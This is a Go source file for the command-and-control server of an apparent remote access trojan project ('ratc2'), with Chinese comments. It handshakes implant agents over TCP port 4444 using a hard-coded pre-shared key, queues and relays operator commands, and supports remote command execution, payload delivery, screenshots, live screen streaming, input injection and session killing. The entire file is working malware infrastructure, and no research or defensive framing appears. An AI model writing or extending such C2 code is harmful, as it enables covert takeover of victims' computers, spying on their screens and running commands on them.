// c2server — C2 中转/管理服务器（M1：会话注册 + 心跳 + list）
package main

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"log"
	"net"
	"sync"
	"time"

	"ratc2/internal/protocol"
	"ratc2/server/internal/session"
)

// M1 配置（后续移入 internal/config）
const (
	listenAddr = "0.0.0.0:4444"
	// 预共享密钥（与 docs/protocol.md §4 一致；生产应外部化）
	pskHex = "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20"
	// 握手版本协商：协议版本 1 << 16 | 兼容版本 1
	helloVersion = uint32(1<<16 | 1)
)

func main() {
	psk, err := hex.DecodeString(pskHex)
	if err != nil {
		log.Fatalf("bad psk: %v", err)
	}

	reg := session.NewRegistry()
	relays := NewRelayMap()
	queue := NewBeaconQueue()
	streams := NewStreamRegistry()
	go reg.SweepLoop(5 * time.Second)

	// Agent 信道：HTTP 轮询（协议 §8）；ctl 信道仍走 TCP 4444
	go startBeaconServer(psk, reg, relays, queue)
	// 屏幕流长连接（协议 §9）：Agent 4445 ↔ ctl 中继
	go startBeaconStreamServer(psk, streams)

	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("listen %s: %v", listenAddr, err)
	}
	log.Printf("c2server listening on %s", listenAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("accept: %v", err)
			continue
		}
		go handleConn(conn, psk, reg, relays, queue, streams)
	}
}

func handleConn(conn net.Conn, psk []byte, reg *session.Registry, relays *RelayMap, queue *BeaconQueue, streams *StreamRegistry) {
	defer conn.Close()
	log.Printf("[conn] %s", conn.RemoteAddr())

	// 第一个包必须是明文 HELLO
	h, raw, err := protocol.ReadPacket(conn)
	if err != nil || h.Cmd != protocol.CmdHello {
		log.Printf("[conn] %s: expected HELLO, got cmd=0x%04x err=%v", conn.RemoteAddr(), cmdOf(h), err)
		return
	}
	s, ok := doHandshake(conn, h, raw, psk)
	if !ok {
		return
	}
	if s.Role == session.RoleAgent {
		agentLoop(conn, s, reg, relays)
	} else {
		ctlLoop(conn, s, reg, relays, queue, streams)
	}
}

// doHandshake 解析 HELLO，派生会话密钥并回复 HELLO_ACK。成功返回会话。
func doHandshake(conn net.Conn, h *protocol.Header, raw []byte, psk []byte) (*session.Session, bool) {
	ver, role, agentID, clientNonce, extra, err := parseHello(raw)
	if err != nil {
		log.Printf("[handshake] %s: %v", conn.RemoteAddr(), err)
		return nil, false
	}
	if ver != helloVersion {
		log.Printf("[handshake] %s: unsupported version 0x%08x", conn.RemoteAddr(), ver)
		return nil, false
	}

	serverNonce := make([]byte, protocol.ServerNonceLen)
	if _, err := randRead(serverNonce); err != nil {
		log.Printf("[handshake] %s: nonce: %v", conn.RemoteAddr(), err)
		return nil, false
	}
	key := protocol.DeriveSessionKey(psk, clientNonce, serverNonce)

	// HELLO_ACK（明文）：accept(1) + server_nonce(16) + server_time(8)
	ack := make([]byte, 0, 1+protocol.ServerNonceLen+8)
	ack = append(ack, 0) // accept=OK
	ack = append(ack, serverNonce...)
	ack = binary.BigEndian.AppendUint64(ack, uint64(time.Now().UnixMilli()))
	if err := protocol.WritePacket(conn, &protocol.Header{
		Seq: h.Seq, Cmd: protocol.CmdHelloAck, Plugin: h.Plugin,
	}, ack); err != nil {
		log.Printf("[handshake] %s: ack: %v", conn.RemoteAddr(), err)
		return nil, false
	}

	s := &session.Session{
		ID:      hex.EncodeToString(agentID),
		Role:    session.Role(role),
		Key:     key,
		IP:      hostOf(conn.RemoteAddr()),
		Port:    portOf(conn.RemoteAddr()),
		OSInfo:  extra.os,
		Plugins: extra.plugins,
		Online:  true,
	}
	s.SetConn(conn)
	s.Touch()
	return s, true
}

// ---- Agent 侧循环：心跳刷新 + BYE 下线 ----

func agentLoop(conn net.Conn, s *session.Session, reg *session.Registry, relays *RelayMap) {
	old := reg.Register(s)
	if old != nil && old != s {
		log.Printf("[agent] %s: duplicate id, kicking old session", s.ID)
		old.Close()
		reg.Unregister(old)
	}
	log.Printf("[agent] %s online from %s os=%q plugins=0x%08x", s.ID, conn.RemoteAddr(), s.OSInfo, s.Plugins)
	defer func() {
		reg.Unregister(s)
		relays.DropAgent(s.ID)
		log.Printf("[agent] %s offline", s.ID)
	}()

	var lastSeq uint32 // 防重放（协议 §4.1）
	for {
		h, raw, err := protocol.ReadPacket(conn)
		if err != nil {
			return
		}
		payload, err := decrypt(h, raw, s.Key)
		if err != nil {
			log.Printf("[agent] %s: decrypt: %v", s.ID, err)
			continue
		}
		// CMD_RESULT 是命令 seq 的回显（与心跳 seq 分属两个计数器），不参与防重放；
		// 仅心跳/其他请求类包做严格递增校验。
		if h.Cmd != protocol.CmdResult && !acceptSeq(&lastSeq, h.Seq) {
			log.Printf("[agent] %s: replay/out-of-order seq=%d (last=%d), drop", s.ID, h.Seq, lastSeq)
			continue
		}
		log.Printf("[agent] %s recv cmd=0x%04x seq=%d len=%d %s", s.ID, h.Cmd, h.Seq,
			len(payload), cmdTag(h.Cmd))
		s.Touch()
		switch h.Cmd {
		case protocol.CmdHeartbeat:
			// 心跳无需应答，Touch 已刷新活跃
		case protocol.CmdBye:
			return
		case protocol.CmdResult:
			// Agent 执行业务指令后的结果：回传给发起请求的 CLI
			if e, ok := relays.Take(s.ID, h.Seq); ok {
				reply(e.cli, e.cliKey, e.cliSeq, protocol.CmdResult, h.Plugin,
					protocol.StatusOK, payload)
			} else {
				log.Printf("[agent] %s: CMD_RESULT for unknown relay seq=%d", s.ID, h.Seq)
			}
		default:
			log.Printf("[agent] %s: unhandled cmd=0x%04x", s.ID, h.Cmd)
		}
	}
}

// ---- CLI 侧循环：管理指令 ----

func ctlLoop(conn net.Conn, s *session.Session, reg *session.Registry, relays *RelayMap, queue *BeaconQueue, streams *StreamRegistry) {

	defer relays.DropCLI(conn)
	defer streams.RemoveCLI(conn)

	log.Printf("[ctl] control session from %s", conn.RemoteAddr())
	var lastSeq uint32 // 防重放（协议 §4.1）
	for {
		h, raw, err := protocol.ReadPacket(conn)
		if err != nil {
			return
		}
		payload, err := decrypt(h, raw, s.Key)
		if err != nil {
			log.Printf("[ctl] decrypt: %v", err)
			continue
		}
		if !acceptSeq(&lastSeq, h.Seq) {
			log.Printf("[ctl] replay/out-of-order seq=%d (last=%d), drop", h.Seq, lastSeq)
			continue
		}
		log.Printf("[ctl] recv cmd=0x%04x seq=%d len=%d %s", h.Cmd, h.Seq, len(payload),
			cmdTag(h.Cmd))

		// 业务指令（0x1xxx/0x2xxx/0x3xxx）：入 Agent 的 beacon 命令队列，
		// 不立即回 CLI；Agent 下次 GET 取走执行，结果 POST 后按 seq 回传。
		if isBusiness(h) {
			if len(payload) < 16 {
				reply(conn, s.Key, h.Seq, h.Cmd, h.Plugin, protocol.StatusBadParam, nil)
				continue
			}
			agentID := hex.EncodeToString(payload[:16])
			target := reg.Get(agentID)
			if target == nil {
				// Agent 不在线，回复“会话不存在”
				reply(conn, s.Key, h.Seq, h.Cmd, h.Plugin, protocol.StatusNoSession, nil)
				continue
			}
			if target.Beacon {

				// ---- Beacon 轮询模式 ----
				// Agent 使用定期 GET 拉取指令，因此将指令放入其命令队列，不立即发送

				cmdSeq := queue.Push(agentID, h.Cmd, payload[16:])

				// 登记中继条目：记录来自哪个 CLI 连接、CLI 密钥、CLI 原始序列号，
				// 以便 Agent 执行完并通过 POST 返回结果后，服务器能找回此 CLI 并回复
				relays.Put(agentID, cmdSeq, relayEntry{cli: conn, cliKey: s.Key, cliSeq: h.Seq})

				// 屏幕流：额外登记等待配对的 ctl（agent 连上 4445 后据此转发帧）
				if h.Cmd == protocol.CmdScreenStream {
					control := byte(0)
					if len(payload) > 16 {
						control = payload[16]
					}
					if control != 0 {
						streams.RegisterRequest(agentID, conn, s.Key)
					} else {
						streams.ClearRequest(agentID)
					}
				}

				log.Printf("[ctl] queued cmd=0x%04x for %s (seq=%d)", h.Cmd, agentID, cmdSeq)

				continue

			} else {

				// ---- 实时长连接模式 ----
				// Agent 保持实时连接，可以直接通过其连接下发指令

				enc, err := protocol.EncryptPayload(target.Key, payload[16:])

				if err != nil {
					// 加密失败：记录日志，并回复 CLI 一个错误状态（可根据协议补充具体状态码）
					log.Printf("[ctl] encrypt for %s failed: %v", agentID, err)
					// reply(conn, s.Key, h.Seq, h.Cmd, h.Plugin, protocol.StatusBadParam, nil)
					continue
				}

				// 分配一个 Agent 会话内的递增序列号，用于匹配 Agent 的响应
				// 必须保证 NextSeq() 是并发安全的（内部使用原子操作或互斥锁），
				// 否则多个 CLI 同时向同一 Agent 转发时会发生序列号冲突。
				agentSeq := target.NextSeq()

				// 先注册中继条目，再发送。如果发送失败，需要删除该条目，防止内存泄漏
				relays.Put(agentID, agentSeq, relayEntry{
					cli:    conn,
					cliKey: s.Key,
					cliSeq: h.Seq,
				})

				// 构造数据包头：使用目标 Agent 的序列号 agentSeq，
				// 标志位 FlagEncrypted 表示负载已加密，命令码和插件标识沿用原请求。
				err = target.WritePacket(&protocol.Header{
					Flags:  protocol.FlagEncrypted,
					Seq:    agentSeq,
					Cmd:    h.Cmd,
					Plugin: h.Plugin,
				}, enc)
				if err != nil {

					// 转发失败：删除中继条目
					log.Printf("[ctl] forward to %s failed: %v", agentID, err)
					relays.Delete(agentID, agentSeq)
					continue
				}

				// 屏幕流：登记等待配对的 ctl（agent 连上 4445 后据此转发帧）
				if h.Cmd == protocol.CmdScreenStream {
					control := byte(0)
					if len(payload) > 16 {
						control = payload[16]
					}
					if control != 0 {
						streams.RegisterRequest(agentID, conn, s.Key)
					} else {
						streams.ClearRequest(agentID)
					}
				}
				continue

			}
		}

		switch h.Cmd {
		case protocol.CmdInputEvents:
			// 输入事件下行（协议 §9.3）：payload = agent_id(16) + count + InputEvent[]
			if len(payload) >= 16 {
				agentID := hex.EncodeToString(payload[:16])
				if !relayInputEvents(streams, agentID, payload) {
					reply(conn, s.Key, h.Seq, h.Cmd, h.Plugin,
						protocol.StatusNoSession, nil)
				}
			} else {
				reply(conn, s.Key, h.Seq, h.Cmd, h.Plugin,
					protocol.StatusBadParam, nil)
			}
		case protocol.CtlList:
			sessions := reg.ListAgents()
			reply(conn, s.Key, h.Seq, protocol.CtlList, protocol.PluginCtl,
				protocol.StatusOK, encodeSessionList(sessions))
		case protocol.CtlGetSession:
			target := reg.Get(string(payload))
			if target == nil {
				reply(conn, s.Key, h.Seq, protocol.CtlGetSession, protocol.PluginCtl,
					protocol.StatusNoSession, nil)
			} else {
				reply(conn, s.Key, h.Seq, protocol.CtlGetSession, protocol.PluginCtl,
					protocol.StatusOK, encodeSessionList([]*session.Session{target}))
			}
		case protocol.CtlKillSession:
			target := reg.Get(string(payload))
			if target == nil {
				reply(conn, s.Key, h.Seq, protocol.CtlKillSession, protocol.PluginCtl,
					protocol.StatusNoSession, nil)
			} else {
				target.Close()
				reply(conn, s.Key, h.Seq, protocol.CtlKillSession, protocol.PluginCtl,
					protocol.StatusOK, nil)
			}
		default:
			log.Printf("[ctl] unhandled cmd=0x%04x", h.Cmd)
		}
	}
}

// ---- 工具 ----

// reply 加密 payload 并回发（seq 关联请求）。
func reply(conn net.Conn, key []byte, seq uint32, cmd uint16, plugin uint8, status uint8, payload []byte) error {
	enc, err := protocol.EncryptPayload(key, payload)
	if err != nil {
		return err
	}
	return protocol.WritePacket(conn, &protocol.Header{
		Flags: protocol.FlagEncrypted, Seq: seq, Cmd: cmd, Plugin: plugin, Status: status,
	}, enc)
}

// decrypt 若 flags 加密则解密。
func decrypt(h *protocol.Header, raw, key []byte) ([]byte, error) {
	if h.Flags&protocol.FlagEncrypted != 0 {
		return protocol.DecryptPayload(key, raw)
	}
	return raw, nil
}

// encodeSessionList 按协议 §5.3 编码会话数组。
func encodeSessionList(sessions []*session.Session) []byte {
	var buf bytes.Buffer
	binary.Write(&buf, binary.LittleEndian, uint32(len(sessions)))
	for _, s := range sessions {
		id, _ := hex.DecodeString(s.ID)
		buf.Write(id[:16])
		ip4 := net.ParseIP(s.IP).To4()
		if ip4 == nil {
			ip4 = net.IPv4zero.To4()
		}
		binary.Write(&buf, binary.BigEndian, ip4) // u32 网络序
		binary.Write(&buf, binary.LittleEndian, s.Port)
		binary.Write(&buf, binary.LittleEndian, uint16(len(s.OSInfo)))
		buf.WriteString(s.OSInfo)
		binary.Write(&buf, binary.LittleEndian, s.Plugins)
		binary.Write(&buf, binary.LittleEndian, uint64(s.LastSeen.UnixMilli()))
		online := uint8(0)
		if s.Online {
			online = 1
		}
		binary.Write(&buf, binary.LittleEndian, online)
	}
	return buf.Bytes()
}

// parseHello 解析 HELLO payload（明文）：
//
//	magic_version u32 | role u8 | agent_id 16B | client_nonce 16B
//	[AGENT] plugins u32 | os_len u16 | os utf8
func parseHello(raw []byte) (ver uint32, role uint8, agentID, clientNonce []byte, extra helloExtra, err error) {
	r := bytes.NewReader(raw)
	var rv uint32
	if err = binary.Read(r, binary.LittleEndian, &rv); err != nil {
		return
	}
	ver = rv
	if role, err = r.ReadByte(); err != nil {
		return
	}
	agentID = make([]byte, 16)
	clientNonce = make([]byte, 16)
	if _, err = r.Read(agentID); err != nil {
		return
	}
	if _, err = r.Read(clientNonce); err != nil {
		return
	}
	if role == uint8(session.RoleAgent) {
		if err = binary.Read(r, binary.LittleEndian, &extra.plugins); err != nil {
			return
		}
		var osLen uint16
		if err = binary.Read(r, binary.LittleEndian, &osLen); err != nil {
			return
		}
		osb := make([]byte, osLen)
		if _, err = r.Read(osb); err != nil {
			return
		}
		extra.os = string(osb)
	}
	return
}

type helloExtra struct {
	plugins uint32
	os      string
}

// cmdTag 返回指令码的可读标识（日志用）
func cmdTag(cmd uint16) string {
	switch cmd {
	case protocol.CmdHello:
		return "(HELLO)"
	case protocol.CmdHelloAck:
		return "(HELLO_ACK)"
	case protocol.CmdHeartbeat:
		return "(HEARTBEAT)"
	case protocol.CmdResult:
		return "(CMD_RESULT)"
	case protocol.CmdBye:
		return "(BYE)"
	case protocol.CmdSysInfo:
		return "(SYS_INFO)"
	case protocol.CmdExecPs:
		return "(EXEC_PS)"
	case protocol.CmdPayload:
		return "(PAYLOAD)"
	case protocol.CmdScreenshot:
		return "(SCREENSHOT)"
	case protocol.CmdScreenStream:
		return "(SCREEN_STREAM)"
	case protocol.CmdStreamHello:
		return "(STREAM_HELLO)"
	case protocol.CmdStreamAck:
		return "(STREAM_ACK)"
	case protocol.CmdScreenFrame:
		return "(SCREEN_FRAME)"
	case protocol.CmdInputEvents:
		return "(INPUT_EVENTS)"
	case protocol.CtlList:
		return "(CTL_LIST)"
	case protocol.CtlGetSession:
		return "(CTL_GET_SESSION)"
	case protocol.CtlKillSession:
		return "(CTL_KILL_SESSION)"
	}
	return ""
}

func cmdOf(h *protocol.Header) uint16 {
	if h == nil {
		return 0
	}
	return h.Cmd
}

func hostOf(a net.Addr) string {
	if t, ok := a.(*net.TCPAddr); ok {
		return t.IP.String()
	}
	return ""
}

func portOf(a net.Addr) uint16 {
	if t, ok := a.(*net.TCPAddr); ok {
		return uint16(t.Port)
	}
	return 0
}

func randRead(b []byte) (int, error) {
	return rand.Read(b)
}

// ---- 业务指令转发：relay 映射（agent 转发序号 → 发起请求的 CLI）----

type relayEntry struct {
	cli    net.Conn
	cliKey []byte // CLI 会话密钥，用于加密回传数据
	cliSeq uint32 // CLI 请求的序列号，用于匹配 CLI 侧响应
}

// RelayMap 维护 agent 转发序号到 CLI 请求的映射
type RelayMap struct {
	mu sync.Mutex
	m  map[string]map[uint32]relayEntry // agentID -> agentSeq -> entry
}

func NewRelayMap() *RelayMap {
	return &RelayMap{m: make(map[string]map[uint32]relayEntry)}
}

// Put 注册一个中继条目，如果内层 map 不存在则先创建
func (r *RelayMap) Put(agentID string, agentSeq uint32, e relayEntry) {
	r.mu.Lock()
	defer r.mu.Unlock()

	inner, ok := r.m[agentID]
	if !ok {
		inner = make(map[uint32]relayEntry)
		r.m[agentID] = inner
	}
	inner[agentSeq] = e
}

// Take 取出并删除指定 agentID 和 agentSeq 的条目，常用于响应到达时匹配
func (r *RelayMap) Take(agentID string, agentSeq uint32) (relayEntry, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()

	inner, ok := r.m[agentID]
	if !ok {
		return relayEntry{}, false
	}

	e, exists := inner[agentSeq]
	if exists {
		delete(inner, agentSeq)
		// 若内层 map 已空，则从外层删除该 agentID，防止内存泄漏
		if len(inner) == 0 {
			delete(r.m, agentID)
		}
	}
	return e, exists
}

// Delete 删除指定 agentID 和 agentSeq 的条目，但不返回条目内容
// 常用于发送失败等场景，需要显式清理未使用的条目
func (r *RelayMap) Delete(agentID string, agentSeq uint32) {
	r.mu.Lock()
	defer r.mu.Unlock()

	inner, ok := r.m[agentID]
	if !ok {
		return
	}
	delete(inner, agentSeq)
	if len(inner) == 0 {
		delete(r.m, agentID)
	}
}

// DropAgent 删除指定 agentID 的所有中继条目，通常在 Agent 下线时调用
func (r *RelayMap) DropAgent(agentID string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.m, agentID)
}

// DropCLI 删除所有由指定 CLI 连接发起的中继条目
// 当 CLI 连接断开时调用，避免悬挂无效的 conn
func (r *RelayMap) DropCLI(conn net.Conn) {
	r.mu.Lock()
	defer r.mu.Unlock()

	// 遍历所有 agentID 和 agentSeq，删除 e.cli == conn 的条目
	for agentID, inner := range r.m {
		for seq, e := range inner {
			if e.cli == conn {
				delete(inner, seq)
			}
		}
		// 若该 agentID 下的内层 map 已空，则删除
		if len(inner) == 0 {
			delete(r.m, agentID)
		}
	}
}

// acceptSeq 防重放（协议 §4.1）：每连接要求 seq 严格递增。
func acceptSeq(last *uint32, seq uint32) bool {
	if seq <= *last {
		return false
	}
	*last = seq
	return true
}

// isBusiness 判断是否为业务指令（0x1xxx/0x2xxx/0x3xxx，由 C2 转发给 agent）。
func isBusiness(h *protocol.Header) bool {
	return h.Cmd>>12 == 0x1 || h.Cmd>>12 == 0x2 || h.Cmd>>12 == 0x3
}
